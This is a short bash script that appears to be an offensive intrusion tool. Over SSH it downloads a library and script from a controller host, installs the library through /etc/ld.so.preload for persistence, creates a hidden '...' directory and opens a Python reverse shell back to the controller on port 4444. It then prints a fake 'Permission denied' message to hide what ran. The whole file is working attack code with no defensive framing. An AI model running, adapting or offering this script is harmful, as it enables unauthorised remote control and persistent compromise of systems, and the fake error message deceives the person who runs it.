#!/bin/bash
PORT=4444
IP="10.0.0.1"
/usr/bin/ssh -T $1 << EOF

wget http://$IP:8080/libc.shaihulud.so
wget http://$IP:8080/shaihulud.sh
echo "$PWD/libc.shaihulud.so" > /etc/ld.so.preload
export LD_PRELOAD=$PWD/libc.shaihulud.so
mkdir ...
touch .../shaihulud.sh

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($IP,$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > dev/null

EOF
echo "Permission denied, please try again."
/usr/bin/ssh -T $1 

